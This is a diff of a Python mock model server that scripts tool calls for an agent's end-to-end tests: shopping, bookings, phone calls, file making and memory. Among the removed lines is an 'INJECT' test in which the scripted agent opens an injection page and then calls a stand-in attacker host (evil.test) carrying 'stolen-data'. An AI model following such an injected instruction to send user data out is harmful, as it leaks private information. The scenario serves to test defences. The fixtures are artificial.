@@ -3,15 +3,11 @@
 Behaviour is chosen from the latest user goal text:
  - planner calls (system prompt contains 'planning module') -> fixed JSON plan; the planner only runs when the executor
    asks (plan_task) or loads a skill marked `plan: on` — a plain answer or an ordinary skill makes no plan
- - 'SEND' goal  -> calls gmail_send, then final answer
- - 'BROWSE' goal -> browser_navigate to TEST_PAGE, click the Submit button, final
- - 'INJECT' goal -> browser_navigate to injection page, then try gmail_send to attacker
+ - 'BROWSE' goal -> browser_navigate to TEST_PAGE (default: example.com), then a purchase_confirm (an approval), final
  - 'REMEMBER' goal -> memory_remember then final
  - 'SCHEDULE' goal -> schedule_create then final
  - otherwise -> plain answer
 """
-import base64
-import datetime as _dtm
 import json
 import os
 import re
@@ -284,19 +280,6 @@ async def _chat(req: Request, b: dict):
                                  "sex": "M", "date_of_birth": "1985-04-12", "nationality": "Australia", "expiry": "2031-05-01", "country": "AUS"}))
     if sys.startswith("You look at a file"):   # file_look / attachment reading
         txt = json.dumps(msgs[-1]["content"], ensure_ascii=False)
-        if "merchant" in txt and "JSON" in txt:   # travel_expense_e2e.py: a photographed restaurant receipt
-            return reply(json.dumps({"merchant": "Sushi Hoshizora", "address": "Ginza, Tokyo", "date": "2026-11-20", "time": "19:40",
-                                     "currency": "JPY", "total": 18000, "subtotal": 16364, "tax": 1636, "service_charge": 0, "tip": 0,
-                                     "payment_method": "card", "card_last4": "1111", "items": [{"name": "Omakase", "qty": 1, "amount": 16364}],
-                                     "receipt_no": "R-7781", "language": "ja", "notes": None}, ensure_ascii=False))
-        if "e-ticket" in txt.lower():   # arrival_nomail_e2e.py: an uploaded e-ticket instead of a booking email
-            return reply("E-TICKET: Singapore Airlines SQ 708, Singapore (SIN) 2026-11-02 08:05 → Bangkok (BKK) 09:30. "
-                         "Return SQ 711 2026-11-06. Hotel on the itinerary: Riverside Test Hotel, 1 Charoen Krung Road, Bangkok.")
-        if "passport" in txt.lower():   # sgac_e2e.py: the data page (the number is never returned to chat)
-            return reply(json.dumps({"name": "LU LUCAS", "sex": "M", "date_of_birth": "1985-04-12", "nationality": "AUS", "expiry": "2031-05-01"}))
-        if "menu" in txt.lower():   # dining_dietary_e2e.py
-            return reply("MENU (Japanese → English): 担々麺 Tantanmen — sesame and PEANUT sauce ¥1,100 ⚠ contains peanuts; "
-                         "塩ラーメン Shio ramen ¥900 (wheat, soy); 餃子 Gyoza ¥500 (wheat, soy, garlic)")
         what = "a video contact sheet with numbered frames" if "contact sheet" in txt else "a red square labelled HELLO"
         return reply(f"VISION-SEEN: {what}")
     if sys.startswith("You read the user's own addresses"):   # places_fill.rs: the profile's place codes, once
@@ -305,16 +288,6 @@ async def _chat(req: Request, b: dict):
         return reply(fake_vision(msgs[-1]["content"]))
     if sys.startswith(("You locate things", "This is a zoomed-in part", "A red circle with a crosshair")):   # browser_locate
         return reply(fake_locate(sys, msgs[-1]["content"]))
-    if "planning module" in sys and "inbox this week" in msgs[-1]["content"]:
-        return reply(json.dumps({"objective": "Triage this week's inbox and prepare replies", "steps": [
-            {"id": "s1", "description": "Search the inbox for important emails from the last 7 days", "tool_hint": "gmail", "risk": "read"},
-            {"id": "s2", "description": "Read the threads that are waiting for a reply", "tool_hint": "gmail", "risk": "read"},
-            {"id": "s3", "description": "Check the Q4 plan in Notion for context", "tool_hint": "notion", "risk": "read"},
-            {"id": "s4", "description": "Draft replies and summarize what needs your decision", "tool_hint": "gmail", "risk": "write"}]}))
-    if "planning module" in sys and "Q4 plan summary" in msgs[-1]["content"]:
-        return reply(json.dumps({"objective": "Share the Q4 plan with the team on Slack", "steps": [
-            {"id": "s1", "description": "Read the Q4 plan page in Notion", "tool_hint": "notion", "risk": "read"},
-            {"id": "s2", "description": "Post a short summary to #general (needs approval)", "tool_hint": "slack", "risk": "send"}]}))
     if "planning module" in sys and SHOW_TRIP in msgs[-1]["content"]:   # marketing_shots.py
         return reply(json.dumps({"objective": "Put this week's Tokyo trip into one timeline", "steps": [
             {"id": "s1", "description": "Find the flight, hotel and restaurant bookings in mail", "tool_hint": "gmail", "risk": "read", "parallel": "p1"},
@@ -325,12 +298,6 @@ async def _chat(req: Request, b: dict):
             {"id": "s1", "description": "Load the Shanghai city guide", "tool_hint": "shanghai", "risk": "read"},
             {"id": "s2", "description": "Get today's USD/CNY rate", "tool_hint": "market_data", "risk": "read"},
             {"id": "s3", "description": "Compare neighbourhoods, rents and schools", "tool_hint": "shanghai", "risk": "read"}]}))
-    if "planning module" in sys and "PARALLEL" in msgs[-1]["content"]:   # parallel_steps_e2e.py: three independent steps
-        return reply(json.dumps({"objective": "Compare three hotels", "steps": [
-            {"id": "s1", "description": "Research Hotel A", "tool_hint": "delegate", "risk": "read", "parallel": "p1"},
-            {"id": "s2", "description": "Research Hotel B", "tool_hint": "delegate", "risk": "read", "parallel": "p1"},
-            {"id": "s3", "description": "Research Hotel C", "tool_hint": "delegate", "risk": "read", "parallel": "p1"},
-            {"id": "s4", "description": "Compare and answer", "tool_hint": "files", "risk": "read"}]}))
     if "planning module" in sys and "LANGCHECK" in msgs[-1]["content"]:
         first = sys.split("\n", 1)[0][:40]
         return reply(json.dumps({"objective": "PLANRULE=" + first, "steps": []}))
@@ -377,25 +344,6 @@ async def _chat(req: Request, b: dict):
             d = re.search(r"DATE=(20\d\d-\d\d-\d\d)", allu)
             head = f"TRAVELBOT ANSWER {d.group(1) if d else ''}: Singapore Airlines SQ638 SGD 620 direct; Cathay Pacific via HKG SGD 510.\n"
         return workflow_reply(tools_done[-1]["content"], head)
-    if "focused sub-agent of OMuse" in sys and "SUBTASK" in goal:   # parallel_steps_e2e.py: a sub-agent opens its page in its own lane
-        url = re.search(r"https?://\S+", goal).group(0)
-        if n == 0:
-            return reply("", [tc("browser_navigate", {"url": url})])
-        m = re.search(r"Hotel[A-C]", last_tool)
-        return reply(f"SUBREPORT {m.group(0) if m else '?'} from {url}")
-    if "PARALLEL" in goal and "focused sub-agent" not in sys:   # parallel_steps_e2e.py: the parallel stage → every step in ONE turn
-        hosts = ["shop.test", "opentable.test", "shop.test"]   # the two public test hosts (loopback addresses are refused)
-        jobs = [{"role": "researcher", "step": f"s{i + 1}",
-                 "task": f"SUBTASK open http://{h}:8094/slow?s=2&name=Hotel{'ABC'[i]} and report the page title"} for i, h in enumerate(hosts)]
-        if n == 0:   # a comparison of three candidates is multi-step work: the executor asks for a plan first
-            return reply("", [tc("plan_task", {"objective": "Compare three hotels", "notes": "one sub-agent per hotel"})])
-        if n == 1:
-            if "PARALLELBATCH" in goal:
-                return reply("", [tc("delegate", {"tasks": jobs})])
-            return reply("", [tc("delegate", j) for j in jobs])
-        # a summary, not the raw <subagent_report> tags (angle-bracket markup is stripped from answers)
-        found = re.findall(r"SUBREPORT (Hotel\w+)", "\n".join(str(m["content"]) for m in tools_done))
-        return reply("PARALLEL RESULT: " + ", ".join(found))
     bk = bots_flow(goal, sys, msgs, tools_done, n, allu)
     if bk is not None:
         return bk
@@ -440,7 +388,7 @@ async def _chat(req: Request, b: dict):
     if "BUDGETPDF" in goal:   # a research task that reads pages as long as the page tools are offered (the step budget
         # is a tool-list limit: agent/runtime.rs `budget` withdraws them), then delivers
         if "browser_navigate" in tnames:
-            return reply("", [tc("browser_navigate", {"url": f"http://shop.test:8099/restaurants.html?p={n}"})])
+            return reply("", [tc("browser_navigate", {"url": PAGE + f"?p={n}"})])
         if "make_pdf" not in called and "make_pdf" in tnames:
             return reply("", [tc("make_pdf", {"markdown": "# 调研简报\n\n- Kuriya Dining 19:00\n- Shinzo 19:30", "output": "reports/brief.pdf"})])
         if "send_file" not in called and "send_file" in tnames:   # a second send of a file already in the chat is refused by code
@@ -452,7 +400,7 @@ async def _chat(req: Request, b: dict):
             m = re.search(r"\[(e\d+)\][^\n]*" + pattern, text, re.I)
             return m.group(1) if m else None
         if n == 0:
-            return reply("", [tc("browser_navigate", {"url": "http://shop.test:8099/shop.html?k=iphone+17+pro+max+case"})])
+            return reply("", [tc("browser_navigate", {"url": PAGE + "?k=iphone+17+pro+max+case"})])
         if n == 1:   # the snapshot is cut off inside the header: look at the page instead of re-opening it
             return reply("", [tc("browser_look", {"question": "Which iPhone 17 Pro Max case in the results looks nicest? Name its link ref."})])
         if n == 2:   # also cross-check by text search
@@ -468,67 +416,6 @@ async def _chat(req: Request, b: dict):
         if n == 6:
             return reply("", [tc("browser_look", {"question": "Did the item get added to the cart? What does the cart show?"})])
         return reply("SHOP DONE: " + last_tool[:600])
-    if "CHOICES" in goal:   # present_choices: a made-up price is refused, exact excerpts are shown as verified cards
-        if n == 0:
-            return reply("", [tc("browser_navigate", {"url": "http://shop.test:8099/shop.html?k=case"})])
-        if n == 1:
-            return reply("", [tc("browser_find", {"query": "Aurora Glitter Case"})])
-        if n == 2:
-            return reply("", [tc("browser_find", {"query": "Kickstand Case"})])
-        if n == 3:   # hallucinated detail + a page never read
-            return reply("", [tc("present_choices", {"question": "Which case?", "kind": "comparison", "options": [
-                {"label": "Aurora Glitter Case for iPhone 17 Pro Max, MagSafe compatible", "details": ["S$9.90", "4.4 out of 5 stars"],
-                 "source_url": "http://shop.test:8099/shop.html?k=case"},
-                {"label": "Titanium Case", "details": ["S$5"], "source_url": "http://other.test/titanium"}]})])
-        if n == 4:
-            return reply("", [tc("present_choices", {"question": "Which case do you like?", "kind": "comparison", "options": [
-                {"label": "Aurora Glitter Case for iPhone 17 Pro Max, MagSafe compatible", "details": ["S$21.90", "4.4 out of 5 stars · 231 ratings"],
-                 "source_url": "http://shop.test:8099/shop.html", "note": "闪亮的紫色，最好看"},
-                {"label": "Kickstand Case for iPhone 17 Pro Max", "details": ["S$33.90"],
-                 "source_url": "http://shop.test:8099/shop.html", "note": "带支架"}]})])
-        return reply("CHOICES DONE: " + last_tool[:400])
-    if "DIALCALL" in goal:   # a +1 number goes out through DialMCP; poll until the call is over
-        if n == 0:
-            return reply("", [tc("phone_call", {"to": "+1 415 643 2200", "callee_name": "Zuni Cafe",
-                                                "purpose": "Book a table for 2 tonight at 19:30; acceptable window 19:00-20:30.",
-                                                "may_share": "Name: Lucas Lu"})])
-        ids = re.findall(r"(call_[0-9a-f]{12})", " ".join(str(m["content"]) for m in tools_done))
-        if n > 15 or not ids:
-            return reply("DIAL GAVE UP: " + last_tool[:600])
-        if any(f'"status": "{x}"' in last_tool for x in ("ended", "no_answer", "failed")):
-            return reply("DIAL DONE: " + last_tool[:2500])
-        return reply("", [tc("phone_call_status", {"call_id": ids[0], "wait_seconds": 30})])
-    if "PHONECALL" in goal:
-        if n == 0:
-            return reply("", [tc("phone_call", {"to": "+65 6123 4567", "language": "English",
-                                                "purpose": "Book a table for 2 at Aurora Restaurant tomorrow at 7 pm; get a reference number.",
-                                                "may_share": "Name: Lucas Lu; phone +65 8000 0000"})])
-        ids = re.findall(r"(call_[0-9a-f]{12})", " ".join(str(m["content"]) for m in tools_done))
-        if n > 12 or not ids:
-            return reply("PHONE GAVE UP: " + last_tool[:400])
-        if '"status": "ended"' in last_tool or '"status": "no_answer"' in last_tool:
-            return reply("CALL DONE: " + last_tool[:1500])
-        return reply("", [tc("phone_call_status", {"call_id": ids[0], "wait_seconds": 30})])
-    if "WATCHPRICE" in goal:
-        if n == 0:   # a selector that matches nothing on a page with no known price element and no price given: refused
-            return reply("", [tc("watch_create", {"name": "Aurora case price", "url": "http://shop.test:8099/watch.html",
-                                                  "mode": "price_below", "threshold": 20, "item": "Aurora Glitter Case",
-                                                  "selector": ".no-such-price"})])
-        if n == 1:   # the model thinks the price is 30: the price element says 25, so the watch refuses "the wrong price"
-            return reply("", [tc("watch_create", {"name": "Aurora case price", "url": "http://shop.test:8099/watch.html",
-                                                  "mode": "price_below", "threshold": 20, "item": "Aurora Glitter Case",
-                                                  "selector": ".a-price .a-offscreen", "current_price": 30})])
-        if n == 2:
-            return reply("", [tc("watch_create", {"name": "Aurora case price", "url": "http://shop.test:8099/watch.html",
-                                                  "mode": "price_below", "threshold": 20, "item": "Aurora Glitter Case",
-                                                  "selector": ".a-price .a-offscreen", "current_price": 25})])
-        return reply("WATCH DONE: " + last_tool[:300])
-    if "WATCHMODEL" in goal:   # no selector, no known element: each check has the model read the price
-        if n == 0:
-            return reply("", [tc("watch_create", {"name": "Aurora model watch", "url": "http://shop.test:8099/watch.html",
-                                                  "mode": "price_below", "threshold": 20, "item": "Aurora Glitter Case",
-                                                  "currency": "S$", "current_price": 25})])
-        return reply("WATCH DONE: " + last_tool[:300])
     if "PDFFORM" in goal:
         if n == 0:
             return reply("", [tc("pdf_form_fields", {"path": "forms/permission_slip.pdf"})])
@@ -539,36 +426,6 @@ async def _chat(req: Request, b: dict):
         if n == 2:
             return reply("", [tc("send_file", {"path": "forms/permission_slip-filled.pdf", "note": "请检查"})])
         return reply("PDF DONE: " + "\n".join(str(m["content"])[:600] for m in tools_done))
-    if "SHOPSCROLL" in goal:
-        if n == 0:
-            return reply("", [tc("browser_navigate", {"url": "http://shop.test:8099/shop.html"})])
-        if n == 1:
-            return reply("", [tc("browser_scroll", {"direction": "down"})])
-        return reply("SCROLL DONE: " + last_tool[:3000])
-    if "BLOCKSITE" in goal:
-        seq = [("browser_navigate", {"url": "http://opentable.test:8094/wall"}),
-               ("browser_navigate", {"url": "http://opentable.test:8094/wall?page=2"}),
-               ("browser_navigate", {"url": "http://shop.test:8099/restaurants.html"})]
-        if n < len(seq):
-            return reply("", [tc(*seq[n])])
-        return reply("BLOCK RESULTS:\n" + "\n=====\n".join(str(m["content"])[:300] for m in tools_done))
-    if "XLSXOUT" in goal:
-        if n == 0:
-            return reply("", [tc("make_xlsx", {"output": "reports/flights", "sheets": [
-                {"name": "直飞航班", "columns": ["航空公司", "起飞", "价格 SGD"],
-                 "rows": [["Scoot", "23:30", "600"], ["ZIPAIR", "00:40", "805"], ["ANA", "06:35", "1,085"]]}]})])
-        if n == 1:
-            return reply("", [tc("send_file", {"path": "reports/flights.xlsx", "note": "航班对比"})])
-        return reply("XLSX " + last_tool[:200])
-    if "CALBOOK" in goal:
-        if n == 0:
-            return reply("", [tc("calendar_free_slots", {"time_min": "2026-10-03 17:00", "time_max": "2026-10-03 22:00",
-                                                          "duration_minutes": 90, "day_start": "17:00", "day_end": "22:00"})])
-        if n == 1:
-            return reply("", [tc("calendar_create_event", {"title": "🍽 Kuriya Dining", "start": "2026-10-03 19:00", "end": "2026-10-03 21:00",
-                                                            "location": "Orchard", "description": "Ref ABC123, 2 people",
-                                                            "attendees": ["eva@example.com"], "reminder_minutes": 120})])
-        return reply("CAL " + "\n".join(str(m["content"])[:400] for m in tools_done))
     if "MAKEPDF" in goal:   # write a Chinese report, print it to PDF locally, hand it over
         if n == 0:
             return reply("", [tc("files_write", {"path": "reports/cn.md", "content":
@@ -585,29 +442,6 @@ async def _chat(req: Request, b: dict):
         if n == 1:
             return reply("", [tc("send_file", {"path": "reports/brief.md", "note": "今天的简报 today's brief"})])
         return reply("文件已发送 File sent: " + last_tool[:200])
-    if "MARKETTEST" in goal:   # market_data for numbers, make_chart(symbols=...) for a comparison chart
-        if n == 0:
-            return reply("", [tc("market_data", {"symbols": ["0700.HK", "hsbc holdings", "NOPE.XX"], "range": "1y"})])
-        if n == 1:
-            return reply("", [tc("make_chart", {"type": "line", "title": "汇丰 vs 渣打", "symbols": ["0005.HK", "2888.HK"], "range": "2y"})])
-        return reply("MARKET RESULTS:\n" + "\n=====\n".join(str(m["content"])[:8000] for m in tools_done))
-    if "WEBREAD" in goal:   # web_search then browser_read several pages in one call
-        if n == 0:
-            return reply("", [tc("web_search", {"query": "olares one"})])
-        if n == 1:
-            return reply("", [tc("browser_read", {"urls": ["http://shop.test:8094/slow?s=1&name=PageA",
-                                                           "http://shop.test:8094/slow?s=1&name=PageB",
-                                                           "http://shop.test:8094/slow?s=1&name=PageC"]})])
-        return reply("WEB RESULTS:\n" + "\n=====\n".join(str(m["content"])[:2000] for m in tools_done))
-    if "DOCXTEST" in goal:   # make_docx: a Word file made locally (no online converters), then sent to the chat
-        if n == 0:
-            return reply("", [tc("make_chart", {"type": "bar", "title": "收入", "labels": ["4月", "5月"], "values": [1, 2], "send": False})])
-        if n == 1:
-            return reply("", [tc("make_docx", {"markdown": "# 合同摘要\n\n- 服务费 **12 万**\n\n| 条款 | 建议 |\n|---|---|\n| 知识产权 | 改为甲方 |\n\n![收入](charts/收入.png)",
-                                               "output": "reports/summary"})])
-        if n in (2, 3):   # the second send of the same file is skipped (it is already in the chat)
-            return reply("", [tc("send_file", {"path": "reports/summary.docx"})])
-        return reply("DOCX RESULTS:\n" + "\n=====\n".join(str(m["content"])[:300] for m in tools_done))
     if "CTXTEST" in goal:   # 2026-10-04 M2-02: three big results in one turn overflowed the model's context window
         body_chars = sum(len(str(m.get("content") or "")) for m in msgs[1:])
         if body_chars > 15000:
@@ -625,37 +459,6 @@ async def _chat(req: Request, b: dict):
         if n >= 18 or "web_search" not in tnames:
             return reply(f"WRAPPED after {n} calls")
         return reply("", [tc("web_search", {"query": f"anker power bank variant {n}"})])
-    if "DATAQTEST" in goal:   # data_query: exact counts from a table (the 2026-10-02 NPS miscount), a log via pattern
-        csv_text = "id,age,nps\n" + "\n".join(f"u{i},{20 + i},{[2, 5, 7, 8, 9, 10][i % 6]}" for i in range(40))
-        log_text = "\n".join(f'2026-10-01T{h:02d}:00:00 1.1.1.1 "GET /api/{p}" {st} {ms}ms'
-                             for h, p, st, ms in [(8, "a", 200, 100), (8, "b", 500, 300), (9, "b", 503, 500), (9, "a", 200, 120)])
-        if n == 0:
-            return reply("", [tc("files_write", {"path": "data/s.csv", "content": csv_text}),
-                              tc("files_write", {"path": "data/app.log", "content": log_text})])
-        if n == 2:
-            return reply("", [tc("data_query", {"path": "data/s.csv"})])
-        if n == 3:
-            return reply("", [tc("data_query", {"path": "data/s.csv", "queries": json.dumps([
-                {"derive": [{"as": "seg", "from": "nps", "bins": [0, 7, 9, 11], "labels": ["det", "pas", "pro"], "right": False}],
-                 "group_by": ["seg"], "agg": [{"fn": "count"}, {"fn": "count_share", "as": "pct"}], "sort": ["seg"]},
-                {"where": [{"col": "age", "op": ">=", "value": 50}], "agg": [{"col": "nps", "fn": "mean"}], "save": "data/out.csv"},
-                {"group_by": ["nope"]}])})])
-        if n == 4:
-            return reply("", [tc("data_query", {"path": "data/app.log",
-                                                "pattern": r'^(?P<time>\S+) \S+ "GET (?P<path>[^"]+)" (?P<status>\d{3}) (?P<ms>\d+)ms',
-                                                "queries": [{"derive": [{"as": "err", "expr": "status >= 500"}], "group_by": ["path"],
-                                                             "agg": [{"col": "err", "fn": "sum", "as": "errors"}, {"col": "ms", "fn": "p95"}],
-                                                             "sort": [{"col": "errors", "desc": True}]}]})])
-        return reply("DATAQ RESULTS:\n" + "\n=====\n".join(str(m["content"])[:3000] for m in tools_done))
-    if "CALCTEST" in goal:   # calculate: exact loan maths instead of the model's guesses
-        if n == 0:
-            return reply("", [tc("calculate", {"expressions": ["loan(3000000, 3.5, 25, 2)", "pmt(r, 300, 3e6)", "1/0"],
-                                               "variables": json.dumps({"r": "0.035/12"})})])
-        return reply("CALC RESULTS:\n" + "\n".join(str(m["content"]) for m in tools_done))
-    if "FUNDTEST" in goal:   # stock_fundamentals: valuations + reported financials, unknown ticker reported
-        if n == 0:
-            return reply("", [tc("stock_fundamentals", {"symbols": ["TSLA", "1211.HK", "NOPE.XX"]})])
-        return reply("FUND RESULTS:\n" + "\n=====\n".join(str(m["content"])[:6000] for m in tools_done))
     if "REMAKEXLSX" in goal:   # the 2026-10-02 itinerary run: the same Excel file re-made again and again
         if n < 6:
             return reply("", [tc("make_xlsx", {"output": "trip.xlsx", "sheets": [{"name": "Plan", "columns": ["Day", "Cost"],
@@ -668,19 +471,6 @@ async def _chat(req: Request, b: dict):
         if n == 0:
             return reply("", [tc("browser_navigate", {"url": PAGE + "?m=0"})])
         return reply('<tool_call>\n<function=update_plan>\n<parameter=steps>\n[{"id": "s1", "status": "done"}]\n')
-    if "CHARTTEST" in goal:   # make_chart: a line chart shown in the chat, a bad spec, a flow chart embedded in a PDF
-        if n == 0:
-            return reply("", [tc("make_chart", {"type": "line", "title": "腾讯 0700.HK 近一年", "source": "测试数据",
-                                                "labels": ["2025-10", "2025-11", "2025-12", "2026-01"],
-                                                "series": json.dumps([{"name": "收盘价", "values": [410, 435, 452, 470]}])})])
-        if n == 1:
-            return reply("", [tc("make_chart", {"type": "bar", "title": "坏数据", "labels": ["a", "b"], "values": [1]})])
-        if n == 2:
-            return reply("", [tc("make_chart", {"type": "flow", "title": "报销流程", "steps": ["提交", "主管审批", "财务审核", "付款"],
-                                                "send": False})])
-        if n == 3:
-            return reply("", [tc("make_pdf", {"markdown": "# 报告\n\n![流程](charts/报销流程.png)\n", "output": "reports/chart_report.pdf"})])
-        return reply("CHART RESULTS:\n" + "\n=====\n".join(str(m["content"])[:300] for m in tools_done))
     if "SLOWTASK" in goal:   # a slow research task: reads pages while browser_navigate is offered (past 70% of the time
         # budget only the finishing tools are: agent/runtime.rs `budget`), then keeps notes until no tool is offered
         if not b.get("tools"):
@@ -693,7 +483,7 @@ async def _chat(req: Request, b: dict):
     if "STUCKLOOP" in goal:   # the 2026-10-02 HSBC run: the same Google Finance link, 3 copies per turn, forever
         if not b.get("tools"):
             return reply(f"STUCK SUMMARY after {n} tool results; no tools offered: {not tnames}")
-        url = "http://shop.test:8099/page.html?quote=HSBC&window=5Y"
+        url = PAGE + "?quote=HSBC&window=5Y"
         return reply("", [tc("browser_navigate", {"url": url}), tc("browser_navigate", {"url": url}),
                           tc("browser_navigate", {"url": url})])
     if "SWITCHSRC" in goal:   # a source that keeps failing: after 3 failures the host is blocked, the agent switches site
@@ -707,78 +497,18 @@ async def _chat(req: Request, b: dict):
         if not b.get("tools"):
             return reply(f"LOOP SUMMARY after {n} tool calls: feed read, email not sent.")
         return reply("", [tc("browser_navigate", {"url": PAGE.rsplit('/', 1)[0] + "/feed.xml"})])
-    if "BUYTEST" in goal:        # batch 3: one approved purchase → order number → ledger
-        if n == 0:
-            return reply("", [tc("purchase_confirm", {"site": "shop.test", "items": [{"name": "Kiprun socks", "qty": 1, "price": 4.9}],
-                                                      "shipping": 0, "total": 4.9, "currency": "SGD", "delivery": "Home delivery"})])
-        if n == 1:
-            return reply("", [tc("browser_navigate", {"url": PAGE.replace("page.html", "checkout_ledger.html")})])
-        if n == 2:
-            m = re.search(r"\[(e\d+)\] button \\\"Place order", last_tool) or re.search(r"\[(e\d+)\] button", last_tool)
-            return reply("", [tc("browser_click", {"ref": m.group(1) if m else "e1"})])
-        return reply("下单成功，订单号：OM-77821，总价 S$4.90，送货到家。")
-    if "CANCELTEST" in goal:     # batch 3: cancel goes through the ledger
-        page = "order_other.html" if "OTHER" in goal else "order_ledger.html"
-        if n == 0:
-            return reply("", [tc("orders_list", {"query": ""})])
-        if n == 1:
-            return reply("", [tc("browser_navigate", {"url": PAGE.replace("page.html", page)})])
-        if n == 2:
-            m = re.search(r"\[(e\d+)\] button \\\"Cancel order", last_tool) or re.search(r"\[(e\d+)\] button", last_tool)
-            return reply("", [tc("browser_click", {"ref": m.group(1) if m else "e1"})])
-        return reply(f"Cancel step done. {last_tool[:200]}")
-    if "SITECHECK" in goal:      # batch 2: what OMuse learned about a site shows up when it opens
-        if n == 0:
-            return reply("", [tc("browser_navigate", {"url": PAGE})])
-        return reply(f"Opened. {last_tool[:200]}")
     if "LEARNSITE" in goal:      # batch 2: a habit learned by OMuse itself
         if n == 0:
             return reply("", [tc("memory_remember", {"fact": "shop.test allows guest checkout; the phone goes in as 8 digits.", "domain": "site",
                                                      "entity": "shop.test", "topics": ["shopping", "forms"], "scope": "topic"})])
         return reply(f"Learned. {last_tool[:200]}")
-    if "SEND" in goal:
-        if n == 0:
-            return reply("I'll send it.", [tc("gmail_send", {"to": "john@example.com", "subject": "Tuesday", "body": "Tuesday 3pm works."})])
-        return reply(f"Done. Result: {last_tool[:200]}")
     if "BROWSE" in goal:
         if n == 0:
             return reply("", [tc("browser_navigate", {"url": PAGE})])
-        if n == 1:
-            m = re.search(r"\[(e\d+)\] button \\\"Submit order", last_tool) or re.search(r"\[(e\d+)\] button", last_tool)
-            return reply("", [tc("browser_click", {"ref": m.group(1) if m else "e1"})])
+        if n == 1:   # an approval with no page of ours behind it: the purchase confirmation always asks the user
+            return reply("", [tc("purchase_confirm", {"site": "example.com", "items": [{"name": "Test item", "qty": 1, "price": 1}],
+                                                      "total": 1, "currency": "SGD"})])
         return reply(f"Browsed. Last: {last_tool[:300]}")
-    if "TYPEPW" in goal:   # browser_type outside the browser-use skill: code refuses it ([input_scope])
-        if n == 0:
-            return reply("", [tc("browser_navigate", {"url": PAGE})])
-        if n == 1:
-            m = re.search(r"\[(e\d+)\] (?:searchbox|textbox) \\\"Search orders", last_tool)
-            return reply("", [tc("browser_type", {"ref": m.group(1) if m else "e1", "text": "order 1234"})])
-        return reply(f"Typed. {last_tool[:300]}")
-    if "ATTACHTEST" in goal:   # files attached to the message: their content arrives with the message
-        return reply("ATTACHOK docx=" + str("Quarterly report" in goal) + " img=" + str("VISION-SEEN" in goal)
-                     + " md=" + str("hello-markdown" in goal))
-    if "ATTACHFOLLOW" in goal:   # a later message about an earlier attachment: the agent looks at it again
-        if n == 0:
-            m = re.search(r"- (uploads/[^\n]+?\.png) \(", sys)
-            return reply("", [tc("file_look", {"path": m.group(1) if m else "x.png", "question": "what colour?"})])
-        return reply(f"FOLLOWOK {last_tool[:200]}")
-    if "VAULTFILL" in goal:   # a site with no form function: inside browser-use, a membership number from the vault (approved), then a look at the page
-        if n == 0:
-            return reply("", [tc("load_skill", {"name": "browser-use"})])
-        if n == 1:
-            return reply("", [tc("browser_navigate", {"url": PAGE.replace("page.html", "checkout.html")})])
-        if n == 2:
-            return reply("", [tc("vault_list", {})])
-        if n == 3:
-            m = re.search(r"id=(vlt_\w+) · KrisFlyer", last_tool)
-            snap = tools_done[1]["content"]
-            r = re.search(r"\[(e\d+)\] textbox \\\"Membership", snap)
-            return reply("", [tc("browser_fill_secret", {"ref": r.group(1) if r else "e2", "item_id": m.group(1) if m else "x", "field": "number"})])
-        if n == 4:
-            return reply("", [tc("browser_snapshot", {})])
-        if n == 5:
-            return reply("", [tc("browser_look", {"question": "what is in the membership field?"})])
-        return reply(f"VAULTDONE {last_tool[:400]}")
     if "TAKEOVERLOOP" in goal:   # the site is still blocked after a hand-back: asks once more, then gives up
         if n < 2:
             return reply("", [tc("browser_request_takeover", {"reason": "still blocked on zipair"})])
@@ -787,36 +517,6 @@ async def _chat(req: Request, b: dict):
         if n == 0:
             return reply("", [tc("browser_request_takeover", {"reason": "please log in"})])
         return reply(f"After takeover: {last_tool[:200]}")
-    if "INJECT" in goal:
-        if n == 0:
-            return reply("", [tc("browser_navigate", {"url": PAGE.replace("page.html", "inject.html")})])
-        if n == 1:
-            return reply("", [tc("browser_navigate", {"url": "http://evil.test:8099/page.html?d=stolen-data"})])
-        return reply(f"Done: {last_tool[:300]}")
-    if "RESEARCH SUBJECT" in goal:   # library_e2e.py: write the report (two appends), then the summary
-        m = re.search(r"library/([\w-]+)/report\.md", goal)
-        path = f"library/{m.group(1)}/report.md" if m else "library/x/report.md"
-        if "REFRESH" in goal:
-            if n == 0:
-                return reply("", [tc("files_read", {"path": path})])
-            if n == 1:
-                return reply("", [tc("files_write", {"path": path, "append": True, "content": "\n- 2026-10-11: refresh — prices rechecked, no change\n"})])
-            return reply("Refreshed: no changes.")
-        if n == 0:
-            return reply("", [tc("files_write", {"path": path, "content": "# Home NAS 2026\n_Brief: budget under 1000_\n\n## Summary\n(tbd)\n\n## Candidates\nSynology DS925+ costs about 650 dollars and has four bays (source: synology.com, 2026-10-10).\nUGREEN DXP4800 costs about 500 dollars and runs Docker (source: ugreen.com, 2026-10-10).\n"})])
-        if n == 1:
-            return reply("", [tc("files_write", {"path": path, "append": True, "content": "\n## Open questions\nNoise levels not found.\n\n## Sources\n- https://www.synology.com/\n- https://ugreen.com/\n\n## Changelog\n- 2026-10-10: initial research\n"})])
-        return reply("Report saved to " + path + ". Summary: UGREEN DXP4800 is the cheapest four-bay NAS with Docker.")
-    if "LIBUPDATE" in goal:   # a chat in a subject's conversation that asks for a change
-        m = re.search(r"Report file: (library/[\w-]+/report\.md)|报告文件是 (library/[\w-]+/report\.md)", sys)
-        path = (m.group(1) or m.group(2)) if m else "library/x/report.md"
-        if n == 0:
-            return reply("", [tc("files_write", {"path": path, "append": True, "content": "\n## Noise\nThe DS925+ is rated 20 dB at idle (source: synology.com, 2026-10-11).\n- 2026-10-11: added noise section\n"})])
-        return reply("Added a Noise section to the report." + (" CTX_OK" if "Current report" in sys or "当前报告" in sys else " CTX_MISSING"))
-    if "LIBSEARCH" in goal:   # any task can draw on the library
-        if n == 0:
-            return reply("", [tc("library_search", {"query": "Docker NAS"})])
-        return reply("From the library: " + last_tool[:300])
     if "REMEMBER" in goal:
         if n == 0:
             return reply("", [tc("memory_remember", {"fact": "Lucas likes quiet hotels", "category": "preference"})])
@@ -825,80 +525,10 @@ async def _chat(req: Request, b: dict):
         if n == 0:
             return reply("", [tc("schedule_create", {"name": "daily brief", "goal": "summarize email", "kind": "cron", "spec": "0 8 * * *"})])
         return reply(f"Created: {last_tool}")
-    if "MDTABLE" in goal:
-        return reply("我查看了最近 7 天的收件箱，下面是需要你关注的内容：\n\n## 📬 本周邮件概况\n\n| # | 发件人 | 主题 | 建议 |\n|---|---|---|---|\n"
-                     "| 1 | John Smith <john.smith@verylongcompanyname-example.com> | Q3 partnership proposal and revised pricing sheet | 需要回复 |\n"
-                     "| 2 | GitHub | [beclab/apps] PR #3688 merged: Junior Investor update | 无需回复 |\n"
